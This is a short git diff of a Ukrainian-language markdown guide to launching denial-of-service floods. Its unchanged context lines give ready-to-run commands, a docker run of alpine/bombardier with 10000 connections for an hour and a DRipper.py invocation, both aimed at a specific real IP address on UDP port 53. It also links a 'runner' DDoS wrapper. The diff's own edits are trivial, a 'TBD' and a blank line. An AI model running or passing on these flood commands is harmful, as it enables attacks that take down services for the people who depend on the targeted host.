@@ -32,7 +32,7 @@ https://hub.docker.com/r/alpine/bombardier
 docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
 ```
 
-**Docker** метод 2 (треба VPN)
+**Docker** метод 2 (треба VPN) - TBD
 
 
 
@@ -52,6 +52,7 @@ python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000
 ```
 
 **runner** (обгортка над DDoS Runner)
+
 https://github.com/nitupkcuf/runner
 що загалом в мене так і не запрацювало толком
 
